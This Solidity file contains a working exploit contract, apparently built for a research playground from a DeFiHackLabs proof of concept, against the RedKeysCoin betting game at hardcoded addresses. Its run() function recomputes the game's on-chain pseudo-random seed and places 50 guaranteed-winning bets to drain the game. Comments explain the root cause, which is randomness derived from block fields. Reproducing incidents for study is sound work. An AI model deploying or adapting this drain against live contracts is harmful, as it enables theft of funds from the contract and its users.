// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-05-RedKeysCoin).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (testExploit() calls game.playGame(...) directly in a loop, and the
// randomNumber() predictor lives on the test itself) -- there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (the loop body + the predictor)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/RedKeysCoin_exp.sol.
//
// Root cause: RedKeysGame.randomNumber() derives its "random" bet result
// entirely from on-chain values readable in the same transaction (counter,
// block fields, msg.sender). A contract calling playGame() can recompute the
// exact same seed off-chain (inside its own bytecode) before it bets, so it
// always wins the 3x payout on a 2-outcome coin flip.

interface IRedKeysGame {
    function playGame(uint16 choice, uint16 ratio, uint256 amount) external;
    function counter() external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract RedKeysDrain {
    IRedKeysGame constant game = IRedKeysGame(0x71e3056aa4985de9f5441f079E6C74454A3C95f0);
    IERC20 constant coin = IERC20(0x00e62b6CCf1fe3e5E01CE07F6232d7F378518b6b);

    uint256 constant BET_AMOUNT = 1e9;
    uint256 constant NUM_PLAYS = 50;

    // step 0: approve the game to pull stake, then play 50 always-winning bets.
    function run() external {
        coin.approve(address(game), type(uint256).max);

        for (uint256 i = 0; i < NUM_PLAYS; i++) {
            // read the current counter (playGame increments it BEFORE drawing,
            // so the seed uses counter + 1)
            uint256 counter = game.counter();

            // predict the "random" bet result off-chain, using the exact same
            // formula as RedKeysGame.randomNumber()
            uint16 betResultExpectation = uint16(randomNumber(counter + 1)) % 2;

            // bet the prediction -- guaranteed win, 3x payout
            game.playGame(betResultExpectation, 2, BET_AMOUNT);
        }
    }

    // random number generator with the same logic as RedKeysGame.randomNumber(),
    // parameterized on the counter value the on-chain call will observe.
    function randomNumber(
        uint256 counter
    ) internal view returns (uint256) {
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    counter + block.timestamp + block.prevrandao
                        + ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) + block.gaslimit
                        + ((uint256(keccak256(abi.encodePacked(address(this))))) / (block.timestamp)) + block.number
                )
            )
        );

        return (seed - ((seed / 1000) * 1000));
    }
}
